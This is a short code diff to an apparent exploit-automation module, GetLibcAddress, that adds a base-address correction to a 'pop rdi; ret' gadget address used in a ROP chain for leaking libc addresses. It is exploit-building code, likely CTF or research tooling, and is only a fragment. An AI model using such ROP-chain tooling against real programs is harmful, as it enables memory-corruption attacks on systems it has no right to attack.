@@ -33,7 +33,7 @@ class GetLibcAddress(AbstractModule):
             cls.logger.critical(f"Failed to find the target function")
             return None
         target_function_name, target_function_address = result
-        pop_rdi = target.rop.find_gadget(['pop rdi', 'ret']).address
+        pop_rdi = target.rop.find_gadget(['pop rdi', 'ret']).address + target.base_address_fix
 
         rop_chain = (
                 p64(pop_rdi) +
